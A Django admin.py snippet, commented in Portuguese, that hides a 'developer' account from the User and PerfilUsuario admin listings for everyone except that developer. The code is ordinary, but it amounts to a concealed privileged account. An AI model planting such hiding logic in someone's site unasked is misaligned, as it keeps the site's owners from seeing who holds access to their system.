"""
Adicione este bloco ao final do seu admin.py existente.
Registra o PerfilUsuario no painel Django Admin, ocultando o usuário developer
de qualquer listagem que não seja feita pelo próprio developer.
"""

from django.contrib import admin
from django.contrib.auth.models import User
from django.contrib.auth.admin import UserAdmin as BaseUserAdmin
from .models import PerfilUsuario   # ajuste o import conforme sua estrutura


# ─── Inline de Perfil dentro do User ─────────────────────────────────────────

class PerfilInline(admin.StackedInline):
    model  = PerfilUsuario
    can_delete = False
    verbose_name_plural = 'Perfil de Acesso'
    fields = ('nivel', 'oculto')


# ─── UserAdmin customizado que oculta o developer ────────────────────────────

class UserAdminCustom(BaseUserAdmin):
    inlines = (PerfilInline,)

    def get_queryset(self, request):
        qs = super().get_queryset(request)
        # Verifica se o usuário logado é developer
        try:
            nivel_logado = request.user.perfil.nivel
        except Exception:
            nivel_logado = None

        if nivel_logado == 'developer':
            return qs  # developer vê tudo

        # Oculta usuários marcados como ocultos (developer)
        return qs.exclude(perfil__oculto=True)


# Re-registra o User com o Admin customizado
admin.site.unregister(User)
admin.site.register(User, UserAdminCustom)


# ─── Admin do Perfil (acesso direto) ─────────────────────────────────────────

@admin.register(PerfilUsuario)
class PerfilUsuarioAdmin(admin.ModelAdmin):
    list_display  = ['user', 'nivel', 'oculto']
    list_filter   = ['nivel', 'oculto']
    search_fields = ['user__username', 'user__email']

    def get_queryset(self, request):
        qs = super().get_queryset(request)
        try:
            nivel_logado = request.user.perfil.nivel
        except Exception:
            nivel_logado = None

        if nivel_logado == 'developer':
            return qs
        return qs.exclude(oculto=True)
